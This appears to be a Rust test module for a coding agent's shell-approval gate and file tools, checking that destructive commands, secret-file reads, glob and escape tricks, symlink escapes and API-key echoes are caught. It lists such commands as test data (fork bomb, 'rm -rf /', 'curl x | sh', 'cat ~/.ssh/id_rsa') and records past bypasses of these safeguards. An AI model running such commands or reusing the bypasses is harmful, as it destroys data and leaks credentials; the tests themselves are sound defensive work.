        assert!(out.contains("[exit 0]"), "saída: {}", &out[..out.len().min(200)]);
        assert!(out.contains("saída cortada"), "o corte em MAX_OUTPUT continua valendo");
    }

    #[test]
    fn teto_zero_desliga_o_corte() {
        let dir = sandbox();
        let out = executar_bash(&dir, "echo sem-teto", None);
        assert!(out.contains("sem-teto") && out.contains("[exit 0]"), "saída: {out}");
    }

    #[test]
    fn stderr_e_codigo_de_saida_continuam_chegando() {
        let dir = sandbox();
        let out = executar_bash(&dir, "echo erro >&2; exit 3", Some(Duration::from_secs(10)));
        assert!(out.contains("[stderr]") && out.contains("erro"), "saída: {out}");
        assert!(out.contains("[exit 3]"), "saída: {out}");
    }

    // ── F-05: is_destructive tokenizado ─────────────────────────────────────
    //
    // Achado F-05 da revisão de 01/09/2026. Cada caso aqui é uma grafia que a versão
    // por substring deixava cair em `Confirm` — onde o "t/Sempre" vale, que é
    // exatamente o que `Always` existe para impedir.

    #[test]
    fn destrutivo_pega_as_variantes_de_flag_que_a_substring_perdia() {
        // A grafia procurada era literalmente "rm -rf". Estas são o mesmo comando.
        for c in [
            "rm -rf build",
            "rm -fr build",
            "rm -r -f build",
            "rm -r --force build",   // o exemplo do achado
            "rm --recursive build",
            "rm -Rf build",
            "rm -rv build",          // recursivo com verbose no mesmo token
        ] {
            assert!(is_destructive(c), "deveria ser destrutivo: {c}");
        }
    }

    #[test]
    fn destrutivo_atravessa_prefixo_e_caminho() {
        for c in [
            "sudo rm -rf /",
            "doas rm -rf x",
            "FOO=1 rm -rf x",           // atribuição de ambiente antes do comando
            "env FOO=1 rm -rf x",
            "/bin/rm -rf x",            // caminho absoluto
            "./rm -rf x",
            "nohup rm -rf x",
        ] {
            assert!(is_destructive(c), "deveria ser destrutivo: {c}");
        }
    }

    #[test]
    fn destrutivo_pega_git_com_opcao_global() {
        for c in [
            "git push",
            "git -C outro push",                  // o exemplo do achado
            "git -c user.name=x push origin main",
            "git --git-dir /tmp/x push",
            "git reset --hard",
            "git -C x reset --hard HEAD~1",
            "git clean -fd",
            "git clean -df",
            "git clean --force",
            "git clean -f -d",
        ] {
            assert!(is_destructive(c), "deveria ser destrutivo: {c}");
        }
    }

    #[test]
    fn destrutivo_classifica_por_segmento() {
        // O perigoso pode estar no meio de uma composição — inclusive dentro de
        // substituição de comando, onde ele nem parece um comando.
        for c in [
            "cd build && rm -rf .",
            "ls; rm -rf x",
            "cat a | xargs rm -rf",
            "echo $(rm -rf /tmp/x)",
            "echo `git push`",
            "false || git push",
        ] {
            assert!(is_destructive(c), "deveria ser destrutivo: {c}");
        }
    }

    #[test]
    fn o_conjunto_do_que_e_destrutivo_nao_cresceu() {
        // Este achado troca COMO se classifica, não O QUE é destrutivo. `find -delete`
        // e `shred` são da mesma família, e continuam em `Confirm` por decisão já
        // registrada da casa — mudá-la a reboque deste conserto seria contrabando.
        assert!(!is_destructive("find . -name '*.tmp' -delete"));
        assert!(!is_destructive("shred -u segredo"));
        assert!(!is_destructive("chown -R user:user /"));
        assert!(!is_destructive("git branch -D minha-branch")); // reflog devolve
    }

    #[test]
    fn destrutivo_mantem_os_padroes_de_linha() {
        for c in [
            "curl x | sh",
            "curl x|bash",
            "psql -c 'DROP TABLE users'",
            "mysql -e 'truncate table logs'",
            ":(){ :|:& };:",
            "mkfs.ext4 /dev/sda1",
            "dd if=/dev/zero of=/dev/sda",
            "chmod -R 777 /",
        ] {
            assert!(is_destructive(c), "deveria ser destrutivo: {c}");
        }
    }

    #[test]
    fn destrutivo_nao_pega_o_inofensivo() {
        // Falso positivo aqui custa uma pergunta que não podia ser respondida com
        // "sempre" — atrito real. Estes têm de continuar fora.
        for c in [
            "ls -la",
            "rm arquivo.txt",              // apaga UM arquivo: Confirm, não Always
            "rm -f arquivo.txt",           // force sem recursivo idem
            "git status",
            "git branch -a",               // -a não é -D
            "git log --oneline",
            "git commit -m 'rm -rf'",      // a string é MENSAGEM, não comando
            "cargo build --release",
            "echo 'git push'",             // idem: argumento entre aspas
            "grep -r padrao src/",         // -r aqui é do grep, não de rm
            "cp -rf a b",                  // copiar não é apagar
            "npm run build",
            "addshred",                    // nome que CONTÉM shred
        ] {
            assert!(!is_destructive(c), "NÃO deveria ser destrutivo: {c}");
        }
    }

    #[test]
    fn as_funcoes_de_apoio_isoladas() {
        assert_eq!(segmentos_de_comando("a && b; c | d").len(), 4);
        assert_eq!(segmentos_de_comando("echo 'a; b'").len(), 1); // `;` entre aspas não separa
        assert_eq!(comando_e_args("sudo FOO=1 rm -rf x").unwrap().0, "rm");
        assert_eq!(comando_e_args("/usr/bin/git push").unwrap().0, "git");
        assert!(comando_e_args("   ").is_none());
        assert!(tem_flag(&["-rf".into()], 'r', &["recursive"]));
        assert!(tem_flag(&["--recursive".into()], 'r', &["recursive"]));
        assert!(tem_flag(&["--force=yes".into()], 'f', &["force"]));
        assert!(!tem_flag(&["-f".into()], 'r', &["recursive"]));
        assert!(!tem_flag(&["arquivo-r".into()], 'r', &["recursive"])); // não é flag
        assert_eq!(git_subcomando(&["-C".into(), "x".into(), "push".into()]).unwrap().0, "push");
    }

    #[test]
    fn classify_promove_o_que_virou_destrutivo() {
        // A prova que liga a mudança ao efeito: não basta `is_destructive` responder
        // true, a política tem de virar `Always` — é ela que tira o "t/Sempre".
        assert!(matches!(classify("rm -r --force build"), Policy::Always));
        assert!(matches!(classify("git -C outro push"), Policy::Always));
        assert!(matches!(classify("ls -la"), Policy::Auto));
        assert!(matches!(classify("rm arquivo.txt"), Policy::Confirm));
    }
    use super::*;
    use crate::gate::Policy;
    use crate::ui::Ui;

    fn sandbox() -> std::path::PathBuf {
        // Dir ÚNICO por chamada (os testes rodam em paralelo — não podem
        // compartilhar o mesmo temp senão um apaga os arquivos do outro).
        use std::sync::atomic::{AtomicUsize, Ordering};
        static N: AtomicUsize = AtomicUsize::new(0);
        let id = N.fetch_add(1, Ordering::SeqCst);
        let dir = std::env::temp_dir().join(format!("anna-tools-test-{}-{id}", std::process::id()));
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(dir.join("src")).unwrap();
        std::fs::write(dir.join("README.md"), b"# Demo\n").unwrap();
        std::fs::write(dir.join("src/main.rs"), b"fn main() { let bug = 1; }\n").unwrap();
        std::fs::write(dir.join(".env"), b"SECRET=x\n").unwrap();
        dir
    }

    #[test]
    fn read_recusa_env_e_le_arquivo() {
        let root = sandbox();
        assert!(read_file(&root, ".env", MAX_BYTES).starts_with("RECUSADO"));
        assert!(read_file(&root, "src/main.rs", MAX_BYTES).contains("fn main"));
    }

    /// Approves everything and remembers the path the card named.
    #[derive(Default)]
    struct Aprova {
        cartao: String,
        politicas: Vec<Policy>,
    }

    impl Frontend for Aprova {
        fn on_event(&mut self, _: &crate::types::Event) {}
        fn end_stream(&mut self) {}
        fn tool_result(&mut self, _: &ToolCall, _: &str) {}
        fn turn_end(&mut self, _: &crate::telemetry::Telemetry) {}
        fn error(&mut self, _: &str) {}
        fn warn(&mut self, _: &str) {}
        fn approve(&mut self, policy: Policy, _: &str, _: &str, preview: &Preview) -> bool {
            self.politicas.push(policy);
            if let Preview::Diff { path, .. } = preview {
                self.cartao = path.to_string();
            }
            true
        }
        fn continuar_apos_teto(&mut self, _: usize) -> bool {
            false
        }
        fn aviso_teto(&mut self, _: usize) {}
    }

    /// 0.15.7: a whole-file write replaces the file with what the model believes is in it; when it
    /// never read the file, or the file changed since, the write would erase what it did not see.
    #[test]
    fn sobrescrever_exige_ter_visto_o_arquivo_como_ele_esta() {
        let root = sandbox();
        std::fs::write(root.join("app.rs"), "fn main() {}\n").unwrap();
        let mut fe = Aprova::default();

        // Never read: refused before any approval card.
        let cego = write_file(&root, "app.rs", "fn main() { novo() }\n", "w1", &mut fe);
        assert!(cego.starts_with("RECUSADO") && cego.contains("não foi lido inteiro"), "{cego}");
        assert!(fe.politicas.is_empty(), "refused before asking anyone");

        // Read whole, then changed on disk (the person's edit): refused again.
        read_file(&root, "app.rs", MAX_BYTES);
        std::fs::write(root.join("app.rs"), "fn main() { do_dev() }\n").unwrap();
        let velho = write_file(&root, "app.rs", "fn main() { novo() }\n", "w2", &mut fe);
        assert!(velho.starts_with("RECUSADO") && velho.contains("mudou desde a sua última leitura"), "{velho}");
        assert_eq!(std::fs::read_to_string(root.join("app.rs")).unwrap(), "fn main() { do_dev() }\n", "the person's edit survives");

        // Read as it is now: the write goes through, and what it wrote counts as seen.
        read_file(&root, "app.rs", MAX_BYTES);
        assert!(write_file(&root, "app.rs", "fn main() { novo() }\n", "w3", &mut fe).starts_with("ok"));
        assert!(edit_file(&root, "app.rs", "novo", "novo2", false, "e1", &mut fe).starts_with("ok"));
        assert!(write_file(&root, "app.rs", "fn main() {}\n", "w4", &mut fe).starts_with("ok"), "its own edit does not make the file stale");

        // A new file needs no read; a read cut at max_bytes does not count as whole.
        assert!(write_file(&root, "novo.rs", "x\n", "w5", &mut fe).starts_with("ok"));
        std::fs::write(root.join("grande.txt"), "y".repeat(100)).unwrap();
        read_file(&root, "grande.txt", 10);
        assert!(write_file(&root, "grande.txt", "z\n", "w6", &mut fe).starts_with("RECUSADO"));
        let _ = std::fs::remove_dir_all(&root);
    }

    /// 0.15.4: what goes into an instruction file is loaded into every later session, so a session-wide
    /// "t/Sempre" for the write tools must not cover it. Other files keep the ordinary confirmation.
    #[test]
    fn escrever_arquivo_de_instrucao_pergunta_sempre() {
        let root = sandbox();
        std::fs::write(root.join("CLAUDE.md"), "regras\n").unwrap();
        std::fs::write(root.join("notas.md"), "x\n").unwrap();
        std::fs::create_dir_all(root.join("app")).unwrap();
        let mut fe = Aprova::default();
        edit_file(&root, "CLAUDE.md", "regras", "outras regras", false, "e1", &mut fe);
        edit_file(&root, "notas.md", "x", "y", false, "e2", &mut fe);
        write_file(&root, "app/AGENTS.md", "novo\n", "w1", &mut fe);
        write_file(&root, "app/README.md", "novo\n", "w2", &mut fe);
        assert_eq!(fe.politicas, vec![Policy::Always, Policy::Confirm, Policy::Always, Policy::Confirm]);
        assert_eq!(std::fs::read_to_string(root.join("CLAUDE.md")).unwrap(), "outras regras\n", "approved, it is written");
        let _ = std::fs::remove_dir_all(&root);
    }

    /// 🔴 External review, 26/10/2026: the grep tool read what read_file refuses — a non-ignored
    /// `certs/server.pem` came back line by line, and an explicit `.env` bypassed .gitignore.
    #[test]
    fn grep_respeita_a_denylist() {
        let root = sandbox();
        std::fs::create_dir_all(root.join("certs")).unwrap();
        std::fs::write(root.join("certs/server.pem"), b"SECRET_PEM\n").unwrap();
        std::fs::write(root.join("aws_credentials.txt"), b"SECRET_AWS\n").unwrap();
        std::fs::write(root.join("src/lib.rs"), b"// SECRET is just a word here\n").unwrap();

        let out = grep(&root, "SECRET", "", "");
        assert!(!out.contains("SECRET_PEM") && !out.contains("SECRET_AWS"), "a denied file was read: {out}");
        assert!(out.contains("src/lib.rs:1"), "an ordinary file is still searched: {out}");
        assert!(out.contains("denylist"), "the model is told files were skipped: {out}");
        assert!(grep(&root, "", ".env", "").starts_with("RECUSADO"));
        assert!(!grep(&root, "SECRET", "certs", "").contains("SECRET_PEM"), "an explicit folder walks through the same check");
    }

    /// 🔴 External review, 26/10/2026: a symlink already in the tree (an untrusted repository
    /// carries them) took the write outside the project, and took read/edit to denied files.
    #[cfg(unix)]
    #[test]
    fn link_simbolico_nao_fura_o_confinamento_nem_a_denylist() {
        use std::os::unix::fs::symlink;
        let root = sandbox();
        let fora = root.with_extension("fora");
        std::fs::write(&fora, b"original\n").unwrap();
        symlink(&fora, root.join("notes.md")).unwrap();
        symlink(".env", root.join("readme-env.txt")).unwrap();
        std::fs::create_dir_all(root.join(".git/hooks")).unwrap();
        std::fs::write(root.join(".git/hooks/pre-commit"), b"#!/bin/sh\n").unwrap();
        symlink(".git/hooks/pre-commit", root.join("hook.txt")).unwrap();
        let mut fe = Aprova::default();

        assert!(write_file(&root, "notes.md", "PWNED\n", "1", &mut fe).starts_with("ERRO"));
        assert_eq!(std::fs::read_to_string(&fora).unwrap(), "original\n", "the file outside the project is untouched");
        assert!(read_file(&root, "readme-env.txt", MAX_BYTES).starts_with("RECUSADO"));
        assert!(!grep(&root, "SECRET", "readme-env.txt", "").contains("SECRET=x"));
        assert!(edit_file(&root, "hook.txt", "#!/bin/sh", "#!/bin/sh\nid", false, "2", &mut fe).starts_with("RECUSADO"));
        assert!(write_file(&root, "hook.txt", "id\n", "3", &mut fe).starts_with("RECUSADO"));
        assert_eq!(std::fs::read_to_string(root.join(".git/hooks/pre-commit")).unwrap(), "#!/bin/sh\n");
        assert!(fe.cartao.is_empty(), "nothing above reached an approval card");

        // A link that stays inside the project still works — and the card names the real file.
        symlink("README.md", root.join("leia.md")).unwrap();
        read_file(&root, "leia.md", MAX_BYTES); // 0.15.7: an existing file is read before it is overwritten
        assert!(write_file(&root, "leia.md", "# Novo\n", "4", &mut fe).starts_with("ok"));
        assert_eq!(fe.cartao, "leia.md → README.md");
        assert_eq!(std::fs::read_to_string(root.join("README.md")).unwrap(), "# Novo\n");
    }

    /// 🔴 External review, 26/10/2026: the argument check reads tokens literally, so a glob the
    /// SHELL expands to `.env` or `certs/server.pem` was `Auto` and its contents reached the model.
    #[test]
    fn glob_sem_aspas_nao_e_automatico() {
        for cmd in ["cat .e*", "cat certs/*", "head -n 50 .e*", "cat *", "cat .{env,x}", "grep SECRET src/*.rs", "cd src && cat *"] {
            assert_eq!(classify(cmd), Policy::Confirm, "should ask: {cmd}");
        }
        for cmd in [
            "ls *.rs",
            "ls -la src/*",
            "wc -l src/*.rs",
            "grep -rn --include=*.rs TODO src",
            "grep -n \"fn .*x\" src/main.rs",
            "grep -n 'a?b' README.md",
            "git ls-files '*.rs'",
        ] {
            assert_eq!(classify(cmd), Policy::Auto, "should not ask: {cmd}");
        }
    }

    #[test]
    fn shell_escapes_require_confirmation() {
        for cmd in [
            r"cat .e\nv",
            r"cat certs/server.p\em",
            r"cat $'.\x65nv'",
            "cat .e\\\nnv",
            r#"cat .e\"n\"v"#,
            r#"cat "notes\ old.txt""#,
            r"cd notes\ old && cat README.md",
        ] {
            assert!(!is_simple_allowlisted(cmd), "the policy does not normalize this syntax: {cmd}");
            assert_eq!(classify(cmd), Policy::Confirm, "should ask: {cmd}");
        }
    }

    #[test]
    fn single_quoted_backslashes_and_plain_reads_stay_automatic() {
        for cmd in [
            r"grep '\d+\s' src/main.rs",
            r"echo '\$HOME'",
            r"cat 'notes\old.txt'",
            "cat src/main.rs",
            "cd app && git status && cat README.md",
        ] {
            assert!(is_simple_allowlisted(cmd), "the shell leaves this argument literal: {cmd}");
            assert_eq!(classify(cmd), Policy::Auto, "should not ask: {cmd}");
        }
    }

    #[test]
    fn grep_e_glob_acham() {
        let root = sandbox();
        assert!(grep(&root, "bug", "", "*.rs").contains("src/main.rs:1"));
        assert!(glob_files(&root, "src/**/*.rs").contains("src/main.rs"));
    }

    #[test]
    fn host_oferece_so_bash() {
        let d = defs_host();
        assert_eq!(d.len(), 1, "modo host deve oferecer 1 ferramenta");
        assert_eq!(d[0].name, "bash");
        assert!(defs().len() > 1, "modo local oferece o conjunto todo");
    }

    /// 🔴 `echo $SHVIA_API_KEY` devolvia a chave ao modelo sem cartão nenhum.
    ///
    /// Medido em 21/09/2026: em `argumento_de_caminho_recusado`, a checagem de `$` estava
    /// ATRÁS do portão `if !parece_caminho { continue; }`. E `parece_caminho` exige `~`, `.`
    /// ou `/` — `$SHVIA_API_KEY` não tem nenhum dos três, então o `continue` disparava e a
    /// linha do `$` nunca rodava. `echo` está na ALLOWLIST, logo: `Policy::Auto`.
    ///
    /// ⚠️ **O produto inteiro é desenhado em volta de não expor essa chave** — nunca por
    /// argumento de CLI (apareceria no `ps`), `config.toml` em 0600 com aviso de permissão
    /// frouxa, `.env` e `*.pem` na denylist. E a porta aberta era o comando mais simples que
    /// existe, com a saída voltando direto para o modelo.
    #[test]
    fn expansao_de_variavel_nunca_e_auto() {
        assert_ne!(classify("echo $SHVIA_API_KEY"), Policy::Auto,
            "a chave da instalação volta ao modelo sem cartão");
        assert_ne!(classify("echo ${SHVIA_API_KEY}"), Policy::Auto,
            "a forma com chaves escapava do mesmo jeito");
        assert_ne!(classify("printf %s $OPENAI_API_KEY"), Policy::Auto);
        assert_ne!(classify("echo $HOME"), Policy::Auto,
            "não dá para decidir por NOME de variável: quem lista segredo esquece o próximo");
    }

    /// 🔴 Controle POSITIVO, e é o preço que o docblock da guarda já declarava.
    ///
    /// Fechar a expansão de variável faz `grep "$padrao" arquivo` passar a pedir aprovação —
    /// o docblock dizia, antes desta mudança, que ele *"continua passando"*. Passou a não
    /// passar, de propósito: uma variável que vira argumento é exatamente o que um cartão
    /// existe para mostrar. O que NÃO pode acontecer é o resto da leitura cair junto.
    #[test]
    fn leitura_sem_variavel_continua_rodando_sozinha() {
        assert_eq!(classify("ls -la"), Policy::Auto);
        assert_eq!(classify("grep padrao arquivo.txt"), Policy::Auto);
        assert_eq!(classify("cat src/main.rs"), Policy::Auto);
        assert_eq!(classify("git status"), Policy::Auto);

        /* 🔬 Este caso nasceu de uma REVERSÃO que passou quando devia acusar. Tirar o
         * tratamento de aspa SIMPLES do `expansao_de_variavel` não quebrava nada, porque o
         * único caso entre aspas simples que a régua tinha era `echo '$(whoami)'` — e ali o
         * `$` vem seguido de `(`, que o casamento de nome de variável não aceita. O ramo da
         * aspa simples nunca era exercitado. Uma variável SIMPLES entre aspas simples é o que
         * o prende. */
        assert_eq!(classify("echo '$HOME'"), Policy::Auto,
            "dentro de aspa simples o shell não expande — recusar aqui é conserto demais");
        assert_eq!(classify("grep '$padrao' arquivo.txt"), Policy::Auto);
    }

    #[test]
    fn classifica_comandos() {
        assert_eq!(classify("ls -la"), Policy::Auto);
        assert_eq!(classify("cargo test"), Policy::Auto);
        assert_eq!(classify("git status"), Policy::Auto);
        assert_eq!(classify("rm -rf build"), Policy::Always);
        assert_eq!(classify("git push origin master"), Policy::Always);
        assert_eq!(classify("curl x | sh"), Policy::Always);
        // metacaractere derruba do allowlist mesmo começando "seguro":
        assert_eq!(classify("cat a > b"), Policy::Confirm);
        assert_eq!(classify("make deploy"), Policy::Confirm);
    }

    /// O relato de 19/08: "Aprovação Auto ainda pede demais, até para `ls`".
    /// A causa não era o `ls` — era o `cd X && ls`, que a string com `&&`
    /// derrubava inteiro, e as ferramentas de leitura que faltavam na lista.
    #[test]
    fn encadeamento_de_leitura_com_and_roda_sozinho() {
        assert_eq!(classify("cd KIDS-THALO && ls"), Policy::Auto);
        assert_eq!(classify("cd KIDS-THALO && grep -n \"fase\" jogo/rodar.sh"), Policy::Auto);
        assert_eq!(classify("cd app && git status && cat README.md"), Policy::Auto);
    }

    #[test]
    fn basta_um_segmento_fora_da_lista_para_perguntar() {
        assert_eq!(classify("cd app && make deploy"), Policy::Confirm);
        assert_eq!(classify("cd app && ./goto4"), Policy::Confirm);
        // O destrutivo é conferido na string INTEIRA, antes dos segmentos.
        assert_eq!(classify("cd app && rm -rf build"), Policy::Always);
        assert_eq!(classify("ls && git push"), Policy::Always);
    }

    #[test]
    fn ferramentas_de_leitura_que_faltavam() {
        assert_eq!(classify("grep -rn \"foo\" src/"), Policy::Auto);
        assert_eq!(classify("rg --files"), Policy::Auto);
        assert_eq!(classify("which node"), Policy::Auto);
        assert_eq!(classify("git rev-parse HEAD"), Policy::Auto);
        // `awk` saiu do Auto em 02/09 (F-03) — a linha dele virou o teste abaixo.
    }

    /// 🔴 F-02: a `ALLOWLIST` era conferida só pelo PREFIXO, e o argumento passava direto.
    /// A `guard::denied` que a tool `read_file` respeita era contornável pelo `bash` ao lado.
    #[test]
    fn argumento_de_segredo_nao_e_automatico() {
        for cmd in [
            "cat .env",
            "cat '.env'",
            "cat \".env\"",
            "cat ~/.ssh/id_rsa",
            "cat ../../.env",
            "cat /etc/passwd",
            "grep SENHA .env.local",
            "head -5 certs/server.pem",
            "cat \"$HOME/.ssh/id_rsa\"",
            "diff src/main.rs ../fora/outro.rs",
        ] {
            assert_eq!(classify(cmd), Policy::Confirm, "deveria pedir cartão: {cmd}");
        }
    }

    /// O outro lado da mesma guarda: leitura normal não pode passar a perguntar, senão o
    /// gate volta a treinar o dev a aprovar sem ler (o defeito de 19/08).
    #[test]
    fn leitura_normal_continua_automatica() {
        for cmd in [
            "cat README.md",
            "ls src",
            "ls -la",
            "head -20 src/main.rs",
            "grep -rn TODO src/",
            "grep SECRET .",
            "echo ola",
            "echo '$(whoami)'",
            "cut -d: -f1 lista.txt",
            "git log --oneline -5",
            "cd src && cat main.rs",
        ] {
            assert_eq!(classify(cmd), Policy::Auto, "não deveria perguntar: {cmd}");
        }
    }

    /// F-03: comandos que estavam em `Auto` pelo NOME e escrevem ou executam pelo ARGUMENTO.
    #[test]
    fn comandos_que_escrevem_ou_executam_saem_do_auto() {
        // awk executa e grava de dentro do próprio programa, que é texto entre aspas.
        assert_eq!(classify("awk 'BEGIN{system(\"id\")}'"), Policy::Confirm);
        assert_eq!(classify("awk '{print > \"/tmp/x\"}' README.md"), Policy::Confirm);
        assert_eq!(classify("awk 'NR>=37 && NR<=46' rodar.sh"), Policy::Confirm);
        // `git branch` é leitura até virar `-D`.
        assert_eq!(classify("git branch"), Policy::Auto);
        assert_eq!(classify("git branch -a"), Policy::Auto);
        assert_eq!(classify("git branch --merged main"), Policy::Auto);
        assert_eq!(classify("git branch -D main"), Policy::Confirm);
        assert_eq!(classify("git branch -m novo"), Policy::Confirm);
        // `sort -o` e o segundo posicional do `uniq` são DESTINO.
        assert_eq!(classify("sort lista.txt"), Policy::Auto);
        assert_eq!(classify("sort -o saida.txt lista.txt"), Policy::Confirm);
        assert_eq!(classify("uniq lista.txt"), Policy::Auto);
        assert_eq!(classify("uniq lista.txt saida.txt"), Policy::Confirm);
    }

    #[test]
    fn find_so_e_leitura_enquanto_nao_escreve() {
        assert_eq!(classify("find . -name '*.rs'"), Policy::Auto);
        assert_eq!(classify("find . -name '*.tmp' -delete"), Policy::Confirm);
        assert_eq!(classify("find . -exec rm {} ;"), Policy::Confirm); // `rm` simples não é "destrutivo" na lista; o -exec basta para perguntar
        assert_eq!(classify("find . -exec cat {} +"), Policy::Confirm);
    }

    /// `sed` fica fora por decisão registrada: guarda incompleta em gate de
    /// segurança é pior que ausência de guarda (ver `leitura_condicional`).
    #[test]
    fn sed_continua_pedindo_aprovacao() {
        assert_eq!(classify("sed -n '37,46p' rodar.sh"), Policy::Confirm);
        assert_eq!(classify("sed -i 's/a/b/' x"), Policy::Confirm);
    }

    /// A parte que errei duas vezes ao escrever isto, e por isso tem teste
    /// próprio: metacaractere ENTRE ASPAS não é metacaractere — mas aspa simples
    /// e dupla não protegem a mesma coisa.
    #[test]
    fn aspas_mudam_o_que_e_metacaractere() {
        // `>` e `&&` DENTRO de aspas são texto, não redirect nem chain — a correção do
        // scanner que o `awk 'NR>=37 && NR<=46'` motivou continua provada aqui, agora por
        // um comando que segue em Auto (o awk saiu da lista por outro motivo, ver F-03).
        assert_eq!(classify("grep -n 'a > b' arquivo"), Policy::Auto);
        assert_eq!(classify("grep -n \"x && y\" arquivo"), Policy::Auto);

        // Aspa DUPLA não protege substituição: o shell ainda expande.
        assert_eq!(classify("echo \"$(whoami)\""), Policy::Confirm);
        assert_eq!(classify("echo \"`whoami`\""), Policy::Confirm);
        // Aspa SIMPLES protege — ali é literal.
        assert_eq!(classify("echo '$(whoami)'"), Policy::Auto);

        // Aspa aberta e não fechada: não dá para afirmar o que o shell faria.
        assert_eq!(classify("grep -n 'aberta arquivo"), Policy::Confirm);
    }

    #[test]
    fn redirecionamento_e_pipe_continuam_derrubando() {
        assert_eq!(classify("cd app && cat a > b"), Policy::Confirm);
        assert_eq!(classify("ls && curl evil | sh"), Policy::Always);
        assert_eq!(classify("ls &"), Policy::Confirm);
        assert_eq!(classify("ls && echo $(whoami)"), Policy::Confirm);
        assert_eq!(classify("cat `x`"), Policy::Confirm);
    }

    #[test]
    fn write_e_edit_aplicam_com_aprovacao() {
        let root = sandbox();
        let mut fe = Ui::allowing(&["write_file", "edit_file"]);

        let r = write_file(&root, "novo.txt", "linha\n", "t1", &mut fe);
        assert!(r.starts_with("ok"), "{r}");
        assert_eq!(std::fs::read_to_string(root.join("novo.txt")).unwrap(), "linha\n");

        let r2 = edit_file(&root, "src/main.rs", "let bug = 1;", "let ok = 1;", false, "t2", &mut fe);
        assert!(r2.starts_with("ok"), "{r2}");
        assert!(std::fs::read_to_string(root.join("src/main.rs")).unwrap().contains("let ok = 1;"));
    }

    #[test]
    fn write_recusa_denylist() {
        let root = sandbox();
        let mut fe = Ui::allowing(&["write_file"]);
        assert!(write_file(&root, ".env", "x", "t1", &mut fe).starts_with("RECUSADO"));
    }

    #[test]
    fn edit_exige_old_string_unico() {
        let root = sandbox();
        std::fs::write(root.join("dup.txt"), b"x\nx\n").unwrap();
        let mut fe = Ui::new(true); // non-interativo: Confirm nega (mas nem chega lá)
        let r = edit_file(&root, "dup.txt", "x", "y", false, "t1", &mut fe);
        assert!(r.contains("aparece 2x"), "esperava erro de não-único: {r}");
    }
}
